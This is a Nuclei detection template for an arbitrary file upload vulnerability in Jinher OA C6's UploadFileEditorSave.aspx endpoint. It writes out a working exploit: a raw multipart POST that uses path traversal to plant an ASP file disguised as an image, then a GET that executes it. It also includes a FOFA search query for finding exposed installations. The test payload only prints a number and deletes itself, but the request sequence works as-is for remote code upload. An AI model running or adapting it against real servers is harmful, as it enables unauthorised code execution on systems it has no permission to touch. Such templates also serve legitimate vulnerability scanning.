id: jinher-oa-c6-ploadfileeditorsave-fileupload

info:
  name: 金和 OA c6 UploadFileEditorSave.aspx - fileupload
  author: cnaq
  severity: critical
  description: 
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_uploadfileeditorsave%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    veified: true
    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
  tags: jinher,fileupload,oa

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\{{filename}}.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
        Content-Type: multipart/form-data; boundary=----{{boundary}}

        ------{{boundary}}
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jpg"
        Content-Type: image/png

        <% response.write(111*111)
        set myfso=server.CreateObject("scripting.filesystemobject") 
        myfso.DeleteFile(Server.MapPath("{{filename}}.asp"))%>

        ------{{boundary}}--

      - |
        GET /C6/{{filename}}.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0



    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"12321")